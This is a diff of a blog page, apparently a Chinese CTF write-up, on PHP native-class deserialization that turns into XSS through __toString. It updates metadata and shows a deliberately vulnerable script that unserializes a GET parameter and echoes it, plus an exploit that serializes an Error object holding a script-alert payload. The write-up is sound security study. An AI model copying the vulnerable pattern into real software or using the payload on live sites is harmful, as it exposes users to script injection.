@@ -92,16 +92,16 @@
 
 
 
-<meta name="description" content="做了很多道PHP反序列化的题目，还没遇到过这种，做完决定来总结一下PHP反序列化 利用__toString方法产生XSS下面分别对两种利用方法进行复现">
+<meta name="description" content="做了很多道PHP反序列化的题目，还没遇到过这种，做完决定来总结一下PHP反序列化 利用__toString方法产生XSS下面分别对两种利用方法进行复现0x00:Error(适用于PHP7版本)测试源码 12345&lt;?php$a &#x3D; $_GET[&#39;w1ndy&#39;];$b &#x3D; unserialize($a);echo $b;?&gt; exp: 1234&lt;?php$a &#x3D; new Error">
 <meta property="og:type" content="article">
 <meta property="og:title" content="PHP原生类反序列化">
 <meta property="og:url" content="http://www.zxfireworks.xyz/post/7085eacc.html">
 <meta property="og:site_name" content="w1ndy">
-<meta property="og:description" content="做了很多道PHP反序列化的题目，还没遇到过这种，做完决定来总结一下PHP反序列化 利用__toString方法产生XSS下面分别对两种利用方法进行复现">
+<meta property="og:description" content="做了很多道PHP反序列化的题目，还没遇到过这种，做完决定来总结一下PHP反序列化 利用__toString方法产生XSS下面分别对两种利用方法进行复现0x00:Error(适用于PHP7版本)测试源码 12345&lt;?php$a &#x3D; $_GET[&#39;w1ndy&#39;];$b &#x3D; unserialize($a);echo $b;?&gt; exp: 1234&lt;?php$a &#x3D; new Error">
 <meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/phpxss/phpxss0.jpg">
 <meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/phpxss/phpxss1.jpg">
 <meta property="article:published_time" content="2020-08-11T06:05:04.000Z">
-<meta property="article:modified_time" content="2020-08-11T09:00:16.177Z">
+<meta property="article:modified_time" content="2020-11-22T13:20:36.409Z">
 <meta property="article:author" content="w1ndy">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/phpxss/phpxss0.jpg">
@@ -345,8 +345,8 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2020-08-11T17:00:16+08:00">
-                2020-08-11
+              <time title="更新于" itemprop="dateModified" datetime="2020-11-22T21:20:36+08:00">
+                2020-11-22
               </time>
             
           </span>
@@ -412,9 +412,7 @@
 
       
         <p>做了很多道PHP反序列化的题目，还没遇到过这种，做完决定来总结一下<br><a href="https://zxfireworks.xyz/post/d3333ead.html" target="_blank" rel="noopener">PHP反序列化</a></p>
-<h3 id="利用-toString方法产生XSS"><a href="#利用-toString方法产生XSS" class="headerlink" title="利用__toString方法产生XSS"></a>利用__toString方法产生XSS</h3><p>下面分别对两种利用方法进行复现</p>
-<a id="more"></a>
-<p>0x00:Error(适用于PHP7版本)<br>测试源码</p>
+<h3 id="利用-toString方法产生XSS"><a href="#利用-toString方法产生XSS" class="headerlink" title="利用__toString方法产生XSS"></a>利用__toString方法产生XSS</h3><p>下面分别对两种利用方法进行复现<br>0x00:Error(适用于PHP7版本)<br>测试源码</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">'w1ndy'</span>];</span><br><span class="line"><span class="variable">$b</span> = unserialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$b</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 <p>exp:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$a</span> = new Error(<span class="string">"&lt;script&gt;alert('w1ndy')&lt;/script&gt;"</span>);</span><br><span class="line"><span class="built_in">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
@@ -546,7 +544,7 @@
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">49</span>
+                  <span class="site-state-item-count">44</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
